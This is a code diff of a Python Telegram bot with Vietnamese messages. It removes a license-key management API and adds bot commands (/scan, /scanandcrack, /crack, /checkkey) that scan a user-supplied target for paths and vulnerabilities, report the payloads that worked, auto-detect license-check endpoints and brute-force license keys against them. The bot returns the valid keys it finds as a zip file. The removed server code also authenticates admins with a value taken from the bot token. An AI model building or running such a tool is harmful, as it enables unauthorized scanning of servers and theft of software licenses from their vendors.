+• Server: `{results.get('server_info',{}).get('server','?')}`
+• Paths phát hiện: **{paths_found}**
+• Lỗ hổng: **{vulns_found}**
+
+📋 **Server Info:**
+• Status: {results.get('server_info',{}).get('status','?')}
+• Powered By: {results.get('server_info',{}).get('x_powered_by','?')}
+"""
+        if vulns_found>0:
+            scan_text+="\n⚠️ **Lỗ hổng phát hiện:**\n"
+            for v in results['vulnerabilities'][:10]:
+                scan_text+=f"• [{v['type']}] `{v['url']}`\n  Payload: `{v['payload']}`\n"
+        
+        scan_text+=f"\n💡 Dùng `/scanandcrack {target} PATTERN` để scan rồi crack luôn!"
+        
+        # Gửi kết quả qua event loop
+        asyncio.run_coroutine_threadsafe(msg.edit(scan_text),bot.loop)
+    
+    threading.Thread(target=do_scan).start()
+
+# =====================================================================
+# LỆNH SCAN AND CRACK (MỚI - KẾT HỢP)
+# =====================================================================
+@bot.on(events.NewMessage(pattern='/scanandcrack'))
+async def cmd_scan_and_crack(event):
+    """Lệnh /scanandcrack - Scan server trước, sau đó crack key."""
+    uid=event.sender_id
+    parts=event.text.split(maxsplit=2)
+    
+    if len(parts)<3:
+        await event.reply("⚠️ **Cách dùng:** `/scanandcrack http://target.com XXXX-XXXX-XXXX`\nB1: Scan server\nB2: Crack key theo pattern")
+        return
+    
+    target=parts[1].strip()
+    pattern=parts[2].strip().upper()
+    
+    if not target.startswith('http'):
+        target='http://'+target
+    
+    x_count=pattern.count('X')
+    if x_count==0:
+        await event.reply("⚠️ Pattern phải có 'X' làm placeholder.")
+        return
+    
+    total_combinations=len(KEY_CHARSET)**x_count
+    
+    msg=await event.reply(f"""🔄 **SCAN & CRACK TỰ ĐỘNG**
+• Target: `{target}`
+• Pattern: `{pattern}`
+• Tổ hợp crack: **{total_combinations:,}**
+
+⏳ B1: Đang scan server...
+⏳ B2: Sẽ crack sau khi scan xong""")
+    
+    def do_scan_and_crack():
+        # B1: Scan
+        scan_results=run_full_scan(target,uid)
+        paths_found=len(scan_results.get('paths',[]))
+        vulns_found=len(scan_results.get('vulnerabilities',[]))
+        
+        # Cập nhật server URL nếu tìm thấy endpoint API
+        api_found=None
+        for p in scan_results.get('paths',[]):
+            if any(x in p['url'].lower() for x in ['api','check','verify','validate','key','license']):
+                if p['status'] in [200,401,403]:
+                    api_found=p['url']
+                    break
+        
+        if api_found:
+            # Tự động cập nhật server check
+            set_setting(uid,'server_url',api_found)
+            stats['server_url']=api_found
+            update_text=f"\n✅ **Tự động phát hiện API:** `{api_found}`\nĐã cập nhật server check!"
         else:
-            days_remaining = None
-    else:
-        days_remaining = None
+            update_text="\n⚠️ Không phát hiện API tự động, dùng server hiện tại."
+        
+        asyncio.run_coroutine_threadsafe(
+            msg.edit(f"""🔄 **SCAN HOÀN THÀNH - BẮT ĐẦU CRACK**
+• Paths: {paths_found} | Vulns: {vulns_found}
+• Pattern: `{pattern}` | Tổ hợp: {total_combinations:,}
+{update_text}
+⏳ Đang crack... `/stop` để dừng."""),
+        bot.loop)
+        
+        # B2: Crack
+        valid,total=run_crack(pattern,uid)
+        
+        if valid:
+            zp,count=create_pack(valid,f"crack_{pattern}")
+            asyncio.run_coroutine_threadsafe(
+                msg.edit(f"✅ **HOÀN THÀNH SCAN & CRACK!**\n• Valid: {len(valid)}/{total} keys\n• Scan: {paths_found} paths, {vulns_found} vulns"),
+            bot.loop)
+            asyncio.run_coroutine_threadsafe(
+                bot.send_file(event.chat_id,zp,caption=f"🔄 Scan+Crack: {pattern}\n✅ {len(valid)} keys\n🔍 {paths_found} paths found"),
+            bot.loop)
+        else:
+            asyncio.run_coroutine_threadsafe(
+                msg.edit(f"❌ **CRACK HOÀN THÀNH** - Không tìm thấy key hợp lệ.\n• Scan: {paths_found} paths, {vulns_found} vulns"),
+            bot.loop)
     
-    return jsonify({
-        "status": "approved", "message": "UID approved", "code": 0,
-        "time": info.get("time"),
-        "approved_date": datetime.strptime(info.get("time", now_str), "%Y-%m-%d %H:%M:%S").strftime("%d/%m/%Y") if info.get("time") else None,
-        "approved_time": datetime.strptime(info.get("time", now_str), "%Y-%m-%d %H:%M:%S").strftime("%H:%M:%S") if info.get("time") else None,
-        "by": info.get("approved_by"), "key": info.get("key"),
-        "device": info.get("device"), "days_remaining": days_remaining,
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+    threading.Thread(target=do_scan_and_crack).start()
 
-@app.route('/api/heartbeat', methods=['POST'])
-def api_heartbeat():
-    data = request.get_json() or {}
-    uid = str(data.get('uid', ''))
-    key = data.get('key', '')
-    device = data.get('device', 'Unknown')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if not uid or not key:
-        return jsonify({
-            "status": "error", "message": "Missing uid or key", "code": 6001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "invalid", "message": "Key not found", "code": 6002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    k = db["keys"][key]
-    
-    if k.get("udid") != uid:
-        return jsonify({
-            "status": "mismatch", "message": "UID does not match key owner", "code": 6003,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # CHỈ TÍNH GIỜ KHI KEY ĐÃ KÍCH HOẠT
-    if k.get("used", False):
-        try:
-            exp = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-            if now > exp:
-                days_expired = (now - exp).days
-                return jsonify({
-                    "status": "expired", "message": "Key expired", "code": 6004,
-                    "expired_at": k["expires"], "expired_date": exp.strftime("%d/%m/%Y"),
-                    "expired_time": exp.strftime("%H:%M:%S"), "days_expired": days_expired,
-                    "server_time": now_str, "timestamp": int(time.time())
-                }), 200
-            else:
-                days_remaining = (exp - now).days
-                hours_remaining = (exp - now).seconds // 3600
-                minutes_remaining = ((exp - now).seconds % 3600) // 60
-                time_remaining = str(exp - now)
-        except:
-            days_remaining = None
-            hours_remaining = None
-            minutes_remaining = None
-            time_remaining = "Unknown"
-    else:
-        days_remaining = None
-        hours_remaining = None
-        minutes_remaining = None
-        time_remaining = "Key chua kich hoat"
-    
-    k["last_seen"] = now_str
-    k["last_device"] = device
-    k["last_check"] = now_str
-    save_db()
-    
-    return jsonify({
-        "status": "alive", "message": "Heartbeat received", "code": 0,
-        "expires": k.get("expires"),
-        "expiry_date": exp.strftime("%d/%m/%Y") if 'exp' in locals() and 'exp' in vars() else None,
-        "expiry_time": exp.strftime("%H:%M:%S") if 'exp' in locals() and 'exp' in vars() else None,
-        "days_remaining": days_remaining, "hours_remaining": hours_remaining,
-        "minutes_remaining": minutes_remaining, "time_remaining": time_remaining,
-        "last_seen": now_str, "last_seen_date": now.strftime("%d/%m/%Y"),
-        "last_seen_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+# =====================================================================
+# CÁC LỆNH KHÁC
+# =====================================================================
+@bot.on(events.NewMessage(pattern='/checkkey'))
+async def cmd_check(event):
+    uid=event.sender_id; parts=event.text.split(maxsplit=1)
+    if len(parts)<2: await event.reply("⚠️ `/checkkey KEY`"); return
+    key=parts[1].strip()
+    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
+    marker=get_setting(uid,'success_marker')
+    msg=await event.reply("🔍 Đang check...")
+    k,v,resp=check_single_key(key,url,param,marker)
+    if v: await msg.edit(f"✅ **HỢP LỆ:** `{k}`")
+    else: await msg.edit(f"❌ **KHÔNG HỢP LỆ:** `{k}`")
 
-@app.route('/api/deletekey', methods=['POST'])
-def api_deletekey():
-    data = request.get_json() or {}
-    key = data.get('key', '')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not key:
-        return jsonify({
-            "status": "error", "message": "Missing key", "code": 7001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "not_found", "message": "Key not found", "code": 7002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Xóa key
-    deleted_key = db["keys"].pop(key)
-    
-    # Xóa khỏi approved nếu có
-    if "approved" in db:
-        uids_to_remove = [uid for uid, info in db["approved"].items() if info.get("key") == key]
-        for uid in uids_to_remove:
-            db["approved"].pop(uid, None)
-    
-    log(f"API DELETE KEY: {key} | Time: {now_str}")
-    save_db()
-    
-    return jsonify({
-        "status": "success", "message": f"Key {key} deleted", "code": 0,
-        "deleted_at": now_str, "deleted_date": now.strftime("%d/%m/%Y"),
-        "deleted_time": now.strftime("%H:%M:%S"),
-        "key_type": deleted_key.get("type"),
-        "was_used": deleted_key.get("used", False),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/crack'))
+async def cmd_crack(event):
+    uid=event.sender_id; parts=event.text.split(maxsplit=1)
+    if len(parts)<2: await event.reply("⚠️ `/crack XXXX-XXXX-XXXX`"); return
+    pattern=parts[1].strip().upper()
+    if pattern.count('X')==0: await event.reply("⚠️ Cần ký tự X"); return
+    total=len(KEY_CHARSET)**pattern.count('X')
+    msg=await event.reply(f"🔨 Crack: `{pattern}` ({total:,} tổ hợp)...")
+    valid,ttl=run_crack(pattern,uid)
+    if valid:
+        zp,_=create_pack(valid,f"crack_{pattern}")
+        await msg.edit(f"✅ Tìm thấy {len(valid)} key!")
+        await bot.send_file(event.chat_id,zp,caption=f"🔨 {pattern} | {len(valid)} valid")
+    else: await msg.edit(f"❌ Không tìm thấy key trong {ttl} lần thử.")
 
-@app.route('/api/deletekeybulk', methods=['POST'])
-def api_deletekeybulk():
-    data = request.get_json() or {}
-    prefix = data.get('prefix', '')
-    ktype = data.get('type', '')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not prefix and not ktype:
-        return jsonify({
-            "status": "error", "message": "Missing prefix or type", "code": 7003,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "keys" not in db:
-        return jsonify({
-            "status": "not_found", "message": "No keys found", "code": 7004,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    keys_to_delete = []
-    for k, v in list(db["keys"].items()):
-        match = False
-        if prefix and k.startswith(prefix + "-"):
-            match = True
-        if ktype and v.get("type") == ktype:
-            match = True
-        if match:
-            keys_to_delete.append(k)
-    
-    deleted_count = 0
-    for key in keys_to_delete:
-        db["keys"].pop(key)
-        deleted_count += 1
-    
-    # Clean up approved
-    if "approved" in db:
-        uids_to_remove = [uid for uid, info in db["approved"].items() if info.get("key") in keys_to_delete]
-        for uid in uids_to_remove:
-            db["approved"].pop(uid, None)
-    
-    log(f"API DELETE BULK: {deleted_count} keys | Prefix: {prefix} | Type: {ktype} | Time: {now_str}")
-    save_db()
-    
-    return jsonify({
-        "status": "success", "message": f"{deleted_count} keys deleted", "code": 0,
-        "deleted_count": deleted_count, "deleted_at": now_str,
-        "deleted_date": now.strftime("%d/%m/%Y"), "deleted_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/stop'))
+async def cmd_stop(event):
+    uid=event.sender_id; stop_flags[uid]=threading.Event(); stop_flags[uid].set()
+    await event.reply("🛑 Đã dừng tác vụ!")
 
-@app.route('/api/kick', methods=['POST'])
-def api_kick():
-    data = request.get_json() or {}
-    uid = str(data.get('uid', ''))
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not uid:
-        return jsonify({
-            "status": "error", "message": "Missing uid", "code": 9002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "kicked" not in db:
-        db["kicked"] = {}
-    if "stats" not in db:
-        db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-    
-    db["kicked"][uid] = {
-        "time": now_str, "by": "api", "reason": "API kick"
-    }
-    if "approved" in db:
-        db["approved"].pop(uid, None)
-    db["stats"]["total_kicked"] = db["stats"].get("total_kicked", 0) + 1
-    
-    log(f"API KICK: {uid} | Time: {now_str}")
-    save_db()
-    
-    return jsonify({
-        "status": "success", "message": f"UID {uid} kicked", "code": 0,
-        "kicked_at": now_str, "kicked_date": now.strftime("%d/%m/%Y"),
-        "kicked_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/status'))
+async def cmd_status(event):
+    u=time.time()-stats['start_time']; h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
+    await event.reply(f"""🌐 **TRẠNG THÁI 24/7**
+⏱️ Uptime: {h}h{m}m{s}s | ✅ Online
+🔑 Checked: {stats['keys_checked']} | Valid: {stats['valid_keys_found']}
+🔍 Scans: {stats['scans_done']} | Vulns: {stats['vulns_found']}
+👥 Users: {stats['active_users']}
+📡 Server: `{stats['server_url']}`
+🕐 Last ping: {stats.get('last_ping','N/A')}""")
 
-@app.route('/api/ban', methods=['POST'])
-def api_ban():
-    data = request.get_json() or {}
-    target = data.get('target', '')
-    reason = data.get('reason', 'API ban')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not target:
-        return jsonify({
-            "status": "error", "message": "Missing target", "code": 9002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "banned_uids" not in bans:
-        bans["banned_uids"] = []
-    
-    bans["banned_uids"].append({
-        "uid": target, "reason": reason, "time": now_str,
-        "banned_date": now.strftime("%d/%m/%Y"), "banned_time": now.strftime("%H:%M:%S")
-    })
-    save_bans()
-    log(f"API BAN: {target} | Reason: {reason} | Time: {now_str}")
-    
-    return jsonify({
-        "status": "success", "message": f"Target {target} banned", "code": 0,
-        "banned_at": now_str, "banned_date": now.strftime("%d/%m/%Y"),
-        "banned_time": now.strftime("%H:%M:%S"), "reason": reason,
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/stats'))
+async def cmd_stats(event):
+    await event.reply(f"""📊 **THỐNG KÊ**
+• Keys checked: {stats['keys_checked']}
+• Valid keys: {stats['valid_keys_found']}
+• Scans done: {stats['scans_done']}
+• Vulns found: {stats['vulns_found']}
+• Crack attempts: {stats['total_crack_attempts']}
+• Files processed: {stats['total_files_processed']}
+• Active users: {stats['active_users']}""")
 
-@app.route('/api/unban', methods=['POST'])
-def api_unban():
-    data = request.get_json() or {}
-    target = data.get('target', '')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not target:
-        return jsonify({
-            "status": "error", "message": "Missing target", "code": 9002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "banned_uids" not in bans:
-        bans["banned_uids"] = []
-    bans["banned_uids"] = [x for x in bans["banned_uids"] if (x.get("uid") if isinstance(x, dict) else x) != target]
-    save_bans()
-    log(f"API UNBAN: {target} | Time: {now_str}")
-    
-    return jsonify({
-        "status": "success", "message": f"Target {target} unbanned", "code": 0,
-        "unbanned_at": now_str, "unbanned_date": now.strftime("%d/%m/%Y"),
-        "unbanned_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/web'))
+async def cmd_web(event):
+    await event.reply(f"🌐 {os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')}")
 
-@app.route('/api/list', methods=['GET'])
-def api_list():
-    admin_key = request.args.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    keys_info = []
-    for k, v in list(db.get("keys", {}).items())[-50:]:
-        key_info = {
-            "key": k[:20] + "...", "type": v.get("type"),
-            "used": v.get("used", False), "expires": v.get("expires"),
-            "activations": v.get("activations", 0), "max": v.get("max_activations", 1)
-        }
-        if v.get("expires"):
-            try:
-                exp = datetime.strptime(v["expires"], "%Y-%m-%d %H:%M:%S")
-                if now > exp:
-                    key_info["status"] = "expired"
-                    key_info["days_expired"] = (now - exp).days
-                else:
-                    key_info["status"] = "active"
-                    key_info["days_remaining"] = (exp - now).days
-            except:
-                key_info["status"] = "unknown"
-        keys_info.append(key_info)
-    
-    return jsonify({
-        "status": "success", "code": 0,
-        "server_time": now_str, "timestamp": int(time.time()),
-        "keys_count": len(db.get("keys", {})),
-        "approved_count": len(db.get("approved", {})),
-        "kicked_count": len(db.get("kicked", {})),
-        "keys": keys_info,
-        "approved": list(db.get("approved", {}).keys())[-50:],
-        "kicked": list(db.get("kicked", {}).keys())[-50:],
-        "banned": bans.get("banned_uids", [])
-    }), 200
+@bot.on(events.NewMessage(pattern='/setserver'))
+async def cmd_setserver(event):
+    uid=event.sender_id; p=event.text.split()
+    if len(p)<4: await event.reply("⚠️ `/setserver [url] [param] [marker]`"); return
+    set_setting(uid,'server_url',p[1]); set_setting(uid,'param_name',p[2]); set_setting(uid,'success_marker',p[3])
+    stats['server_url']=p[1]; await event.reply(f"✅ Đã cấu hình: `{p[1]}`")
 
-@app.route('/api/keyinfo', methods=['POST'])
-def api_keyinfo():
-    data = request.get_json() or {}
-    key = data.get('key', '')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not key:
-        return jsonify({
-            "status": "error", "message": "Missing key", "code": 4001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "not_found", "message": "Key not found", "code": 4002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    k = db["keys"][key]
-    
-    time_info = {}
-    if k.get("created"):
-        time_info["created"] = k["created"]
-        try:
-            created_dt = datetime.strptime(k["created"], "%Y-%m-%d %H:%M:%S")
-            time_info["created_date"] = created_dt.strftime("%d/%m/%Y")
-            time_info["created_time"] = created_dt.strftime("%H:%M:%S")
-            time_info["age_days"] = (now - created_dt).days
-        except:
-            pass
-    
-    if k.get("expires"):
-        time_info["expires"] = k["expires"]
-        try:
-            exp_dt = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-            time_info["expiry_date"] = exp_dt.strftime("%d/%m/%Y")
-            time_info["expiry_time"] = exp_dt.strftime("%H:%M:%S")
-            if now > exp_dt:
-                time_info["status"] = "expired"
-                time_info["days_expired"] = (now - exp_dt).days
-            else:
-                time_info["status"] = "active"
-                time_info["days_remaining"] = (exp_dt - now).days
-                time_info["hours_remaining"] = (exp_dt - now).seconds // 3600
-        except:
-            time_info["status"] = "unknown"
-    
-    if k.get("activated_at"):
-        time_info["activated_at"] = k["activated_at"]
-        try:
-            act_dt = datetime.strptime(k["activated_at"], "%Y-%m-%d %H:%M:%S")
-            time_info["activated_date"] = act_dt.strftime("%d/%m/%Y")
-            time_info["activated_time"] = act_dt.strftime("%H:%M:%S")
-        except:
-            pass
-    
-    if k.get("last_seen"):
-        time_info["last_seen"] = k["last_seen"]
-        try:
-            last_dt = datetime.strptime(k["last_seen"], "%Y-%m-%d %H:%M:%S")
-            time_info["last_seen_date"] = last_dt.strftime("%d/%m/%Y")
-            time_info["last_seen_time"] = last_dt.strftime("%H:%M:%S")
-            time_info["idle_hours"] = (now - last_dt).total_seconds() // 3600
-        except:
-            pass
-    
-    return jsonify({
-        "status": "success", "code": 0,
-        "server_time": now_str, "timestamp": int(time.time()),
-        "key": key, "type": k.get("type"), "prefix": k.get("prefix"),
-        "used": k.get("used", False), "udid": k.get("udid"),
-        "device": k.get("device"), "ip": k.get("ip"),
-        "activations": k.get("activations", 0),
-        "max_activations": k.get("max_activations", 1),
-        "time_info": time_info
-    }), 200
+@bot.on(events.NewMessage(pattern='/servers'))
+async def cmd_servers(event):
+    t="📋 **SERVER MẪU:**\n"
+    for n,c in DEFAULT_SERVERS.items(): t+=f"• **{n}** → `{c['url']}`\n"
+    t+="\nDùng `/useserver [tên]`"; await event.reply(t)
 
-@app.route('/api/revoke', methods=['POST'])
-def api_revoke():
-    data = request.get_json() or {}
-    key = data.get('key', '')
-    admin_key = data.get('admin_key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if admin_key != str(BOT_TOKEN.split(':')[0]):
-        return jsonify({
-            "status": "error", "message": "Invalid admin key", "code": 9001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 403
-    
-    if not key:
-        return jsonify({
-            "status": "error", "message": "Missing key", "code": 5001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "not_found", "message": "Key not found", "code": 5002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    k = db["keys"][key]
-    k["used"] = False
-    k["udid"] = None
-    k["device"] = None
-    k["ip"] = None
-    k["activations"] = 0
-    k["activated_at"] = None
-    k["last_seen"] = None
-    
-    log(f"API REVOKE: {key} | Time: {now_str}")
-    save_db()
-    
-    return jsonify({
-        "status": "success", "message": f"Key {key} revoked", "code": 0,
-        "revoked_at": now_str, "revoked_date": now.strftime("%d/%m/%Y"),
-        "revoked_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+@bot.on(events.NewMessage(pattern='/useserver'))
+async def cmd_useserver(event):
+    uid=event.sender_id; p=event.text.split()
+    if len(p)<2: await event.reply("⚠️ `/useserver [tên]`"); return
+    n=p[1].lower()
+    if n not in DEFAULT_SERVERS: await event.reply("❌ Không có. `/servers`"); return
+    c=DEFAULT_SERVERS[n]
+    set_setting(uid,'server_url',c['url']); set_setting(uid,'param_name',c['param']); set_setting(uid,'success_marker',c['marker'])
+    stats['server_url']=c['url']; await event.reply(f"✅ Đã dùng **{n}**")
 
-# ========== LOGGING ==========
-logging.basicConfig(
-    filename=LOG_FILE,
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
-
-# ========== DB FUNCTIONS ==========
-def load_json(path, default):
+@bot.on(events.NewMessage(pattern='/setthread'))
+async def cmd_thread(event):
+    uid=event.sender_id; p=event.text.split()
+    if len(p)<2: await event.reply(f"⚠️ `/setthread [1-100]` Hiện: {get_setting(uid,'thread_count',10)}"); return
     try:
-        if os.path.exists(path):
-            with open(path, 'r', encoding='utf-8') as f:
-                return json.load(f)
-    except Exception as e:
-        logger.error(f"Load {path} error: {e}")
-    return default
+        n=int(p[1])
+        if 1<=n<=100: set_setting(uid,'thread_count',n); await event.reply(f"✅ {n} threads")
+    except: pass
 
-def save_json(path, data):
-    try:
-        with open(path, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-    except Exception as e:
-        logger.error(f"Save {path} error: {e}")
-
-db = load_json(DB_FILE, {
-    "keys": {}, "approved": {}, "kicked": {}, "logs": [],
-    "devices": {}, "stats": {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-})
-bans = load_json(BAN_FILE, {"banned_ips": [], "banned_uids": [], "banned_devices": []})
-config = load_json(CONFIG_FILE, {
-    "auto_approve": True, "key_expiry_days": 30,
-    "max_devices_per_key": 1, "notify_admin": True, "maintenance": False
-})
-
-def save_db():
-    save_json(DB_FILE, db)
-
-def save_bans():
-    save_json(BAN_FILE, bans)
-
-def save_config():
-    save_json(CONFIG_FILE, config)
-
-def log(msg):
-    ts = time.strftime('%Y-%m-%d %H:%M:%S')
-    entry = f"[{ts}] {msg}"
-    if "logs" not in db:
-        db["logs"] = []
-    db["logs"].append(entry)
-    db["logs"] = db["logs"][-500:]
-    logger.info(msg)
-    save_db()
-
-def is_admin(uid):
-    return uid in ADMIN_IDS
-
-def is_banned(uid, ip=None, device=None):
-    banned_uids = [x.get("uid") if isinstance(x, dict) else x for x in bans.get("banned_uids", [])]
-    banned_ips = [x.get("ip") if isinstance(x, dict) else x for x in bans.get("banned_ips", [])]
-    banned_devices = [x.get("device") if isinstance(x, dict) else x for x in bans.get("banned_devices", [])]
-    return uid in banned_uids or (ip and ip in banned_ips) or (device and device in banned_devices)
-
-def gen_key(prefix, ktype, days=30):
-    code = hashlib.sha256(f"{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:24]
-    k = f"{prefix}-{ktype}-{code}"
-    exp = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
-    if "keys" not in db:
-        db["keys"] = {}
-    if "stats" not in db:
-        db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-    db["keys"][k] = {
-        "type": ktype, "prefix": prefix,
-        "created": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "expires": exp, "used": False,
-        "udid": None, "device": None, "ip": None,
-        "activations": 0, "max_activations": config.get("max_devices_per_key", 1),
-        "last_seen": None, "last_device": None, "last_check": None
-    }
-    db["stats"]["total_keys"] += 1
-    save_db()
-    return k
-
-# ========== BOT ==========
-bot = telebot.TeleBot(BOT_TOKEN, threaded=False, skip_pending=True)
-
-# ========== HANDLERS ==========
-@bot.message_handler(commands=['start'])
-def cmd_start(msg):
-    uid = msg.from_user.id
-    bot.reply_to(msg, f"👋 Chào mừng!\n👤 ID của bạn: `{uid}`\nGửi key để kích hoạt hoặc dùng /help để xem lệnh.", parse_mode="Markdown")
-
-@bot.message_handler(commands=['help'])
-def cmd_help(msg):
-    is_adm = is_admin(msg.from_user.id)
-    user_cmds = "👤 Lệnh User:\n/start - Khởi động\n/id - Xem ID\n/help - Trợ giúp"
-    admin_cmds = (
-        "\n\n🔧 Admin:\n"
-        "/genkey <số> <loại> [prefix] [ngày] - Tạo key\n"
-        "/genkeybulk <số> <loại> <prefix> [ngày] [file] - Tạo hàng loạt\n"
-        "/approve <UID> [ghi chú] - Duyệt UID\n"
-        "/unapprove <UID> - Hủy duyệt\n"
-        "/kick <UID> [lý do] - Kick\n"
-        "/ban <UID/IP> [lý do] - Ban\n"
-        "/unban <UID/IP> - Gỡ ban\n"
-        "/list - DS gần đây\n"
-        "/listall - Xuất file tất cả\n"
-        "/info <UID/Key> - Chi tiết\n"
-        "/stats - Thống kê\n"
-        "/logs [số] - Xem logs\n"
-        "/clearlogs - Xóa logs\n"
-        "/config <key> <value> - Cấu hình\n"
-        "/broadcast <nội dung> - Gửi mass\n"
-        "/backup - Backup DB\n"
-        "/restore <timestamp> - Restore DB\n"
-        "/maintenance - Bật/tắt bảo trì\n"
-        "/deletekey <key> - Xóa key\n"
-        "/deletekeybulk <prefix> <type> - Xóa hàng loạt"
-    )
-    bot.reply_to(msg, user_cmds + (admin_cmds if is_adm else ""), parse_mode="Markdown")
-
-@bot.message_handler(commands=['id'])
-def cmd_id(msg):
-    bot.reply_to(msg, f"👤 User ID: `{msg.from_user.id}`\n💬 Chat ID: `{msg.chat.id}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['genkey'])
-def cmd_genkey(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 3:
-        bot.reply_to(msg, "📌 Cú pháp: /genkey <số> <loại> [prefix] [ngày]")
-        return
-    try:
-        num = int(parts[1])
-        ktype = parts[2]
-        prefix = parts[3] if len(parts) > 3 else "hake"
-        days = int(parts[4]) if len(parts) > 4 else config.get("key_expiry_days", 30)
-        keys = [gen_key(prefix, ktype, days) for _ in range(num)]
-        log(f"ADMIN {msg.from_user.id} GEN {num} KEY")
-        bot.reply_to(msg, "\n".join([f"`{k}`" for k in keys]), parse_mode="Markdown")
-    except Exception as e:
-        logger.error(f"genkey error: {e}")
-        bot.reply_to(msg, f"❌ Lỗi: {e}")
-
-@bot.message_handler(commands=['genkeybulk'])
-def cmd_genkeybulk(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 4:
-        bot.reply_to(msg, "📌 Cú pháp: /genkeybulk <số> <loại> <prefix> [ngày] [file]")
-        return
-    try:
-        num = int(parts[1])
-        ktype = parts[2]
-        prefix = parts[3]
